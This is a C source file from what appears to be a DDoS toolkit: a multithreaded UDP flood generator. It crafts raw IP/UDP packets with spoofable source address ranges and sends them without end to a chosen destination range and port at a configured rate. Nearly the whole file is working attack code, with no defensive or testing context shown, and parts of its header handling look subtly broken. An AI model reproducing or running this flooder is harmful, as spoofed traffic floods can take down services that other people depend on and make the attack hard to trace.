#include "header.h"
#include "base/make_ipv4.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/udp_flood.h"

extern int g_num_threads;
extern int g_packet_size;

// session counting
uint32_t g_udp_num_total;
uint32_t g_udp_num_generated_in_sec;

// from main()
InputArguments g_udp_input;
uint32_t g_udp_request_per_sec;

// for masking next ip address
MaskingArguments g_udp_now;

// thread
pthread_mutex_t g_udp_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_udp_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_udp_before_time;
struct timespec g_udp_now_time;

void UdpFloodPrintUsage(void)
{
    printf("UDP Flooding Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
    return;
}

void *GenerateUdpFlood(void *data)
{
    int sock = MakeRawSocket(IPPROTO_UDP);

    int udp_size = 1024;

    if(g_packet_size < 1024)
        udp_size = g_packet_size;
    char udp_data[BUFFER_SIZE];

    int i;
    for (i = 0; i < udp_size; ++i) {
        udp_data[i] = 'a';
    }
    udp_data[i] = '\0';

    char udp_buf[sizeof(struct udphdr)] = {0, };
    struct udphdr *udp_h_ptr = (struct udphdr *)udp_buf;
    udp_h_ptr->data = (char *)malloc(sizeof(char) * udp_size);
    memcpy(udp_h_ptr->data, udp_data, udp_size);
    udp_h_ptr->checksum = 0;
    udp_h_ptr->src_port = htons(0);
    udp_h_ptr->len = htons(udp_size);

    MaskingArguments udp_now;

    struct iphdr ipv4_h;
    PrepareEmptyIphdr(&ipv4_h);
    ipv4_h.protocol = (IPPROTO_UDP);
    ipv4_h.tot_len += sizeof(struct udphdr) + udp_size;

    char packet[BUFFER_SIZE];
    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_udp_mutex);

        // get now resource
        GetMaskingArguments(&g_udp_input, &g_udp_now);
        udp_now = g_udp_now;

        // wait a second
        if (g_udp_num_generated_in_sec >= g_udp_request_per_sec) {
            pthread_cond_wait(&g_udp_cond, &g_udp_mutex);
        }
        
        g_udp_num_generated_in_sec++;
        g_udp_num_total++;

        // *** end of critical section ***
        pthread_mutex_unlock(&g_udp_mutex);

        // make ipv4 header
        ipv4_h.saddr = inet_addr(udp_now.src);
        ipv4_h.daddr = inet_addr(udp_now.dest);
        ipv4_h.check = IphdrGetChecksum((uint16_t *) &ipv4_h,
                sizeof(struct udphdr) + sizeof(struct icmp));

        // modify udp header
        udp_h_ptr->dest_port = htons(udp_now.port);
        
        // make and send packet
        memset(packet, 0x00, sizeof(packet));
        AssembleIphdrWithData(packet, &ipv4_h, udp_h_ptr, sizeof(struct udphdr) + udp_size);
        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, udp_now.port);
    }
    close(sock);
    return NULL;
}

void *UdpFloodTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_udp_mutex);
        TimeCheck(
                &g_udp_cond,
                &g_udp_before_time,
                &g_udp_now_time,
                &g_udp_num_generated_in_sec);
        pthread_mutex_unlock(&g_udp_mutex);
    }
    return NULL;
}

void UdpFloodMain(char *argv[])
{
    int argc = 0;
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        UdpFloodPrintUsage();
        return;
    }
    // get ip address, mask, port
    ArgvToInputArguments(argv, &g_udp_input);
    g_udp_num_generated_in_sec = 0;
    g_udp_num_total = 0;
    memset(&g_udp_before_time, 0, sizeof(struct timespec));
    memset(&g_udp_now_time, 0, sizeof(struct timespec));
    g_udp_request_per_sec = atoi(argv[3]);
    const int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    int i;
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Sending UDP Flooding requests to %s using %d threads %u per sec\n",
            g_udp_input.dest, num_threads, g_udp_request_per_sec);

    for (i = 0; i < num_threads; i++) {
        pthread_create(
                &threads[i],
                NULL,
                GenerateUdpFlood,
                (void *)&thread_ids[i]);
    }
    pthread_create(&threads[i], NULL, UdpFloodTimeCheck, NULL);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("thread %d joined\n", i);
    }
    pthread_mutex_destroy(&g_udp_mutex);
    printf("UDP Flooding finished\nTotal %u packets sent.\n",
            g_udp_num_total);
    pthread_exit(NULL);
    return;
}
